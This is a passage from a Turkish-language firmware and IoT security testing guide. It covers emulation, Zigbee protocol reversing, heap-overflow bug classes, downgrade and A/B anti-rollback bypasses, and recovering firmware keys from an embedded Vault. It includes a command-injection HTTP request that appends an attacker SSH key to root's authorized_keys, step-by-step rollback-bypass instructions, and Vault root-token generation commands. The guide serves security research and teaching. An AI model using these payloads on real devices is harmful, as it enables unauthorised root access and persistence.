Yavaş açılışlar, yıkıcı başlangıç betikleri veya güvenilmez konsol günlükleri hatayı gizlediğinde, guest dışındaki kalıcı durumu inceleyin. Çalışan bir VM'nin kullandığı overlay'i asla bağlamayın; görüntüyü `qemu-nbd` ile kullanıma açın, LVM keşfini hedeflenen NBD bölümüyle sınırlandırın ve bağlantıyı kesmeden önce volume group'u devre dışı bırakın.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Tekrarlanabilir hata yalıtımı için, zaman damgalı işaretçi dosyalarını kararlı ve yazılabilir bir birime yazın ve bunları çevrimdışı doğrulayın; `/dev/kmsg`, FIFO'lar ve geçici konsollar, hız sınırlaması veya sürecin erken sonlanması nedeniyle yanlış negatif sonuçlar verebilir. Ayrıca ilgisiz kodları değiştirmeden önce katmanlar arasındaki arayüzleri birebir karşılaştırın: `uname -r` ile `/lib/modules/`, diskteki ext4 özellikleri ile kernel yapılandırması ve Mesa `libGL` nesli ile DRI driver ABI ve PCI'dan türetilen driver adları. Bir bileşen mevcut olabilir ve hatta `dlopen()` ile başarıyla yüklenebilir; ancak onu kullanan bileşen farklı bir ABI beklediği için yine de kullanılamaz durumda kalabilir.<sup>[[11]](#references)</sup>

## Pratikte Dinamik Analiz

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. OS'ye ve dosya sistemine shell erişimini sürdürmek çok önemlidir. Emülasyon donanım etkileşimlerini kusursuz şekilde taklit edemeyebilir; bu nedenle zaman zaman emülasyonu yeniden başlatmak gerekebilir. Analiz sırasında dosya sistemi yeniden incelenmeli, açığa çıkan web sayfaları ve ağ hizmetleri exploit edilmeli ve bootloader güvenlik açıkları araştırılmalıdır. Olası backdoor güvenlik açıklarını belirlemek için firmware bütünlük testleri kritik önem taşır.

## Çalışma Zamanı Analizi Teknikleri

Çalışma zamanı analizi; breakpoint'ler ayarlamak ve fuzzing ile diğer teknikleri kullanarak güvenlik açıklarını belirlemek için gdb-multiarch, Frida ve Ghidra gibi araçlarla bir süreç veya binary'nin kendi çalışma ortamında etkileşimli olarak incelenmesini kapsar.

Tam teşekküllü bir debugger bulunmayan embedded hedeflerde, **statik olarak bağlantılanmış bir `gdbserver` dosyasını cihaza kopyalayıp uzaktan bağlanın**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radyo yardımcı işlemci mesaj eşlemesi

IoT hub’larında RF yığını genellikle bir **radyo MCU’su** ile Linux userland süreci arasında bölünür. Yararlı bir iş akışı, yolu eşlemektir:<sup>[[8]](#references)</sup>

1. Havadan alınan **RF frame**
2. Radyo MCU’sundaki **controller-side parser**
3. Linux’a iletilen **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon’daki **application dispatcher**
5. **Protocol-specific handler / state machine**

Bu mimari, tek bir hedef yerine iki reverse engineering hedefi oluşturur. Controller, binary radyo frame’lerini `Group,Command,arg1,arg2,...` gibi metinsel bir protokole dönüştürüyorsa şunları bulun:

- **Message group**’ları ve dispatch table’ları
- Hangi mesajların **network**’ten, hangilerinin controller’ın kendisinden gelebileceği
- Tam **manufacturer-specific discriminator field**’ları (örneğin Zigbee `manufacturer_code` ve özel `cluster_command`)
- Hangi handler’lara yalnızca **commissioning**, discovery veya firmware/model indirme aşamalarında erişilebildiği

Özellikle Zigbee için, pairing trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerine dayanıp dayanmadığını kontrol edin. Öyleyse commissioning trafiğini dinlemek **Network Key**’i açığa çıkarabilir. Zigbee 3.0 install code’ları bu riski azaltır; bu nedenle test edilen cihazın bunları gerçekten zorunlu kılıp kılmadığını not edin.

### Üreticiye özel protocol handler’ları ve FSM ile kısıtlanan erişilebilirlik

Üreticiye özel Zigbee/ZCL komutları, standartlaştırılmış cluster’lardan genellikle daha iyi bir hedeftir; çünkü daha az kapsamlı test edilmiş doğrulama içeren **özel parsing code**’u ve dahili **FSM**’leri kullanırlar.<sup>[[8]](#references)</sup>

Uygulanabilir iş akışı:

- Yalnızca **vendor’a özel handler**’ı bulana kadar command dispatcher’ı reverse edin.
- **FSM state**, **event**, **check**, **action** ve **next-state** table’larını çıkarın.
- Otomatik ilerleyen **geçiş durumlarını** ve saldırganın kontrolündeki durumu sonunda sıfırlayan veya serbest bırakan retry/error branch’lerini belirleyin.
- Hatalı handler’ın her zaman erişilebilir olduğunu varsaymak yerine, daemon’ı zafiyetli duruma getirmek için gereken meşru protocol alışverişlerini doğrulayın.

Zamanlamaya duyarlı protokollerde, Python framework’ünden paket replay etmek çok yavaş olabilir. Daha güvenilir bir yaklaşım, doğru **endpoint**’leri, **attribute**’ları ve commissioning zamanlamasını sağlayabilmek için meşru bir cihazı gerçek donanımda (örneğin bir **nRF52840**) vendor-grade bir stack ile emüle etmektir.

### Embedded daemon’larda parçalı indirme hatası sınıfı

Tekrarlayan bir firmware hatası sınıfı, **parçalı blob/model/configuration indirmelerinde** görülür:<sup>[[8]](#references)</sup>

1. **İlk fragment** (`offset == 0`), `ctx->total_size` değerini kaydeder ve `malloc(total_size)` ile bellek ayırır.
2. Sonraki fragment’ler yalnızca `packet_total_size >= offset + chunk_len` gibi saldırganın kontrolündeki **pakete özgü** alanları doğrular.
3. Kopyalama işlemi, **başlangıçta ayrılan boyutu** denetlemeden `memcpy(&ctx->buffer[offset], chunk, chunk_len)` kullanır.

Bu, saldırganın şunları yapmasına olanak tanır:

- Küçük bir heap allocation oluşturmak için bildirilen toplam boyutu **küçük** olan geçerli bir ilk fragment göndermek.
- Daha büyük bir `chunk_len` ile **beklenen offset** değerine sahip sonraki bir fragment göndermek.
- Yeni kontrolleri karşıladığı hâlde başlangıçta ayrılan buffer’ı taşıran, sahte bir pakete özgü boyut göndermek.

Zafiyetli yol commissioning logic’in arkasındaysa, hatalı fragment’leri göndermeden önce hedefi beklenen model-download veya blob-download durumuna geçirmek için yeterli **device emulation** yapılmalıdır.

### Protocol kaynaklı `free()` tetikleyicileri

Embedded daemon’larda heap metadata exploitation’ı tetiklemenin en kolay yolu çoğu zaman “temizleme işlemini beklemek” değil, **protocol’ün kendi error handling mekanizmasını zorlamaktır**:<sup>[[8]](#references)</sup>

- FSM’i **retry** veya **error** durumlarına geçirmek için hatalı takip fragment’leri gönderin.
- Retry eşiğini aşarak daemon’ın **context’i sıfırlamasını** ve bozulmuş buffer’ı serbest bırakmasını sağlayın.
- Süreç ilgisiz nedenlerle çökmeden önce allocator-side primitive’leri tetiklemek için bu öngörülebilir `free()` çağrısını kullanın.

Bu yöntem, özellikle embedded Linux’taki **musl/uClibc/dlmalloc benzeri** allocator’lara karşı kullanışlıdır. Chunk metadata’sını bozmak, unlink/unbin logic’ini bir write primitive’e dönüştürebilir. Kararlı bir yöntem, gerçek bin pointer’larını hemen bozup süreci çökertmek yerine, allocator traversal’ını taşırılmış buffer içine yerleştirilmiş **sahte chunk**’lara yönlendirmek için bir **size field**’ını bozmaktır.

## Binary exploitation ve Proof-of-Concept

Belirlenen zafiyetler için PoC geliştirmek, hedef mimarinin derinlemesine anlaşılmasını ve düşük seviyeli dillerde programlama yapmayı gerektirir. Embedded sistemlerde binary runtime protection’lar nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekebilir.

### uClibc fastbin exploitation notları (embedded Linux)

- **Fastbin’ler ve consolidation:** uClibc, glibc’ye benzer fastbin’ler kullanır. Daha sonra yapılan büyük bir allocation, `__malloc_consolidate()` çağrısını tetikleyebilir; bu nedenle sahte bir chunk kontrolleri (geçerli bir size, `fd = 0` ve çevresindeki chunk’ların “in use” olarak görülmesi) geçmelidir.<sup>[[6]](#references)</sup>
- **ASLR altında non-PIE binary’ler:** ASLR etkin ancak ana binary **non-PIE** ise, binary içindeki `.data/.bss` adresleri sabittir. Fastbin allocation’ını bir **function pointer table**’a yönlendirmek için geçerli bir heap chunk header’ına benzeyen bir bölgeyi hedefleyebilirsiniz.
- **Parser’ı durduran NUL:** JSON parse edilirken payload içindeki bir `\x00`, sondaki saldırgan kontrollü byte’ları stack pivot/ROP chain için koruyarak parsing’i durdurabilir.
- **`/proc/self/mem` üzerinden shellcode:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP chain, çalıştırılabilir shellcode’u bilinen bir mapping’e yerleştirip oraya atlayabilir.

## Firmware analizi için hazırlanmış işletim sistemleri

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, firmware security testing için gerekli araçlarla donatılmış, önceden yapılandırılmış ortamlar sunar.

## Firmware’i analiz etmek için hazırlanmış işletim sistemleri

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının security assessment ve penetration testing işlemlerini gerçekleştirmenize yardımcı olmak için tasarlanmış bir dağıtımdır. Gerekli tüm araçların yüklü olduğu, önceden yapılandırılmış bir ortam sunarak size zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing işletim sistemi.

## Firmware downgrade saldırıları ve güvenli olmayan update mekanizmaları

Bir üretici firmware image’ları için kriptografik signature kontrolleri uygulasa bile, **version rollback (downgrade) koruması genellikle ihmal edilir**. Boot veya recovery loader, gömülü bir public key ile signature’ı doğruluyor ancak flash edilecek image’ın *version*’ını (veya monotonic counter’ını) karşılaştırmıyorsa, saldırgan geçerli bir signature taşıyan **daha eski ve zafiyetli bir firmware’i** meşru şekilde yükleyerek yamalanmış zafiyetleri yeniden kullanılabilir hâle getirebilir.<sup>[[4]](#references)</sup>

Tipik saldırı iş akışı:

1. **Daha eski, imzalı bir image edinin**
   * Üreticinin herkese açık indirme portalından, CDN’inden veya destek sitesinden alın.
   * Companion mobile/desktop application’lardan çıkarın (ör. bir Android APK içinde `assets/firmware/` altında).
   * VirusTotal, Internet arşivleri, forumlar vb. üçüncü taraf depolardan edinin.
2. Image’ı açık bir update channel üzerinden cihaza **yükleyin veya sunun**:
   * Web UI, mobile-app API, USB, TFTP, MQTT vb.
   * Birçok tüketici IoT cihazı, Base64 ile kodlanmış firmware blob’larını kabul eden, bunları server-side çözen ve recovery/upgrade işlemini başlatan *kimlik doğrulamasız* HTTP(S) endpoint’leri sunar.
3. Downgrade işleminden sonra, daha yeni sürümde yamalanmış bir zafiyeti exploit edin (örneğin sonradan eklenmiş bir command-injection filtresi).
4. İsteğe bağlı olarak, persistence sağlandıktan sonra tespit edilmemek için en yeni image’ı tekrar flash edin veya update’leri devre dışı bırakın.

### Örnek: Downgrade sonrası Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Güvenlik açığı bulunan (downgrade edilmiş) firmware'de `md5` parametresi herhangi bir sanitizasyon uygulanmadan doğrudan bir shell komutuna eklenir ve böylece rastgele komutların enjekte edilmesine olanak tanır (burada SSH anahtarı tabanlı root erişimi etkinleştiriliyor). Daha sonraki firmware sürümlerinde temel bir karakter filtresi eklendi; ancak downgrade korumasının bulunmaması, bu düzeltmeyi etkisiz kılıyor.<sup>[[4]](#references)</sup>

### Mobil Uygulamalardan Firmware Çıkarma

Birçok üretici, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için mobil uygulamalarına tam firmware imajları ekler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi dizinlerde şifrelenmeden saklanır. `apktool`, `ghidra` gibi araçlar, hatta düz `unzip` bile fiziksel donanıma dokunmadan imzalı imajları çıkarmanızı sağlar.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot tasarımlarında yalnızca updater'daki anti-rollback denetimini atlatma

Bazı üreticiler anti-downgrade **ratchet** uygular, ancak bunu yalnızca *updater* mantığında kullanır (örneğin CAN üzerinden bir UDS rutini, bir recovery komutu veya userspace OTA agent). **Bootloader** daha sonra yalnızca image signature/CRC denetimi yapar ve partition table'a ya da slot metadata'sına güvenirse rollback koruması yine de atlatılabilir.<sup>[[7]](#references)</sup>

Yaygın zayıf tasarım:

- Firmware metadata'sı hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet değerini kalıcı depolama alanında tutulan değerle karşılaştırır ve daha eski, imzalı image'ları reddeder.
- Bootloader bu ratchet'i **parse etmez**; boot etmeden önce yalnızca header, CRC ve signature'ı doğrular.
- Slot etkinleştirme bilgisi ayrı olarak bir partition table'da veya slot başına generation counter'da tutulur ve doğrulanan firmware'in tam digest değerine kriptografik olarak **bağlı değildir**.

Bu, dual-slot sistemlerde **bir image'ı doğrula / başka bir image'ı boot et** primitive'i oluşturur. Saldırgan, updater'a güncel ve imzalı bir image ile slot B'yi sonraki boot hedefi olarak işaretletebilir ve ardından reboot etmeden önce slot B'nin üzerine yazabilirse bootloader, yalnızca önceden kaydedilmiş slot metadata'sına güvendiği için eski image'ı boot edebilir.

Yaygın kötüye kullanım adımları:

1. **Güncel ve imzalı** firmware'i pasif slota yükleyin ve layout'un o slotu sonraki etkin slot olarak işaretlemesi için normal validation/switch rutinini çalıştırın.
2. **Henüz reboot etmeyin**. Aynı oturumda slot hazırlama/silme rutinine yeniden girin.
3. Updater'ın az önce etkinleştirilen **aynı fiziksel slotu** silmesi için eski boot-state veya eski slot seçimi mantığını kötüye kullanın.
4. O slota **daha eski ama hâlâ imzalı** bir firmware yazın.
5. Ratchet'i uygulayan validation rutinini atlayın ve doğrudan reboot edin.
6. Bootloader, etkinleştirilen slotu seçer; yalnızca signature/integrity'yi doğrular ve eski image'ı boot eder.

A/B update uygulamalarını reverse ederken dikkat edilecekler:

- Slot seçiminin, başarılı bir switch sonrasında yenilenmeyen **boot-time flag'lerden** türetilmesi.
- **Güncel kaydedilmiş layout** yerine eski state'e göre slot silen `prepare_passive_slot()` benzeri bir rutin.
- Doğrulanan image hash'ini kaydetmek yerine yalnızca bir **generation counter** / active flag değerini artıran `part_write_layout()` benzeri bir fonksiyon.
- Ratchet denetimlerinin userspace veya updater kodunda uygulanması, ancak ROM / bootloader / secure boot aşamalarında **uygulanmaması**.
- İçeriği silinip yeniden yazıldıktan sonra slotu boot edilebilir olarak işaretli bırakan erase veya recovery rutinleri.

### Update Mantığını Değerlendirme Kontrol Listesi

* *Update endpoint*'in taşıma/kimlik doğrulama güvenliği yeterli mi (TLS + kimlik doğrulama)?
* Cihaz, flash işleminden önce **version number'ları** veya bir **monotonic anti-rollback counter** değerini karşılaştırıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (ör. signature'lar ROM code tarafından denetleniyor mu)?
* **Bootloader**, yalnızca signature/CRC denetlemek yerine updater ile aynı ratchet'i uyguluyor mu?
* Slot etkinleştirme metadata'sı **doğrulanmış firmware digest/version değerine bağlı mı**, yoksa slot etkinleştirildikten sonra değiştirilebilir mi?
* Slot değişimi başarılı olduktan sonra cihazın reboot etmesi zorunlu mu, yoksa aynı oturumda sonraki update/erase rutinlerine hâlâ erişilebiliyor mu?
* Userland kodu ek sanity check'ler (ör. izin verilen partition map, model number) gerçekleştiriyor mu?
* *Partial* veya *backup* update akışları aynı validation mantığını yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback saldırılarına karşı savunmasızdır.

## Pratik yapmak için savunmasız firmware

Firmware'deki güvenlik açıklarını bulma pratiği yapmak için başlangıç noktası olarak aşağıdaki savunmasız firmware projelerini kullanın.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state içinden firmware decryption key'lerini kurtarma

Bir update image az miktarda plaintext metadata'yı büyük, yüksek entropili bir blob ile birleştiriyorsa herhangi bir brute-force denemesinden önce container triage yapın:<sup>[[1]](#references)</sup>

- Header'ları, offset'leri ve satır sınırlarını `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile dökümleyin.
- `Salted__` genellikle OpenSSL `enc` formatına işaret eder: sonraki 8 byte salt, geri kalanı ciphertext'tir.
- Tam olarak `256` byte'a decode olan bir Base64 alanı, büyük olasılıkla rastgele bir firmware password/session key'i sarmalayan bir RSA-2048 ciphertext'e baktığınıza işaret eder.
- Aynı dosyadaki detached PGP materyali genellikle yalnızca authenticity'yi korur; bunun confidentiality mekanizması olduğunu varsaymayın.

Statik key araması (`grep`, `strings`, PEM/PGP aramaları) başarısız olursa yalnızca private key'leri aramak yerine **operational decrypt path**'i reverse edin:

- Updater / management binary'sini decompile edin ve şifreli blob'u kimin okuduğunu, hangi helper/API'nin unwrap işlemini yaptığını ve hangi logical key name'in istendiğini izleyin.
- Çıkarılan root filesystem'de KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ile unit file'ları ve init script'lerini arayın.
- Plaintext `vault operator unseal ...`, recovery key'leri, bootstrap token'ları veya yerel KMS auto-unseal script'lerini private-key materyaliyle eşdeğer kabul edin.

Appliance orijinal Vault binary'sini ve storage backend'ini içeriyorsa, bu ortamı yeniden çalıştırmak genellikle Vault internals'ı yeniden uygulamaktan daha kolaydır:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Klonlanmış KMS üzerinde root yetkisiyle:

- Transit key'lerini yalnızca izole klon içinde dışa aktarılabilir yapın: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key'ini dışa aktarın: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA key'ini, KMS'nin kullandığı tam padding/hash çiftiyle deneyin. PKCS#1 v1.5 ile başarısız bir decrypt işlemi ve varsayılan OAEP decrypt işleminin başarısız olması, key'in yanlış olduğunu **kanıtlamaz**; Vault destekli birçok akış SHA-256 ile OAEP kullanırken yaygın kütüphaneler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa, AES-CBC decrypt işlemini denemeden önce satıcının OpenSSL KDF'sini (`EVP_BytesToKey`, eski cihazlarda genellikle MD5) tam olarak yeniden uygulayın.

Böylece "encrypted firmware" daha genel bir probleme dönüşür: **cihaz tarafındaki operasyonel key'leri kurtarın, ardından unwrap + KDF parametrelerini çevrimdışı olarak tam biçimde yeniden uygulayın**.

## Eğitim ve Sertifikalar

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude ile Firmware Cracking: Kıdemli Seviyede Beceri, Junior Seviyesinde Özerklik](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Güvenlik Testi Metodolojisi](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Pratik IoT Hacking: Nesnelerin İnternetine Saldırmak İçin Kesin Rehber](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Terk Edilmiş Donanımlardaki Zero-Day Açıklarını Exploit Etmek – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 Dolarlık Akıllı Bir Cihaz Evime Erişim Sağlamamı Nasıl Sağladı](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Şimdi Beni Görüyorsun: Şimdi Pwned Oldun](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector'ı Şarj Portu Konnektöründen Exploit Etmek - Bölüm 2: Anti-downgrade Korumasını Atlatmak](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Işığı Yak: Philips Hue Bridge'in Over-the-Air Exploitation'ı](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU'da Tesla OS'ta ROOT Yetkisi - Bölüm 1: Paketi Açma](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel belgeleri - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU'da Tesla OS'ta ROOT Yetkisi - Bölüm 2: Debugging ve Düzeltme](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Parolaları: Zayıf XOR Şifrelemesi, SPI Flash'tan Kurtarmaya Olanak Sağlıyor (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS parolası kurtarma araçları](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
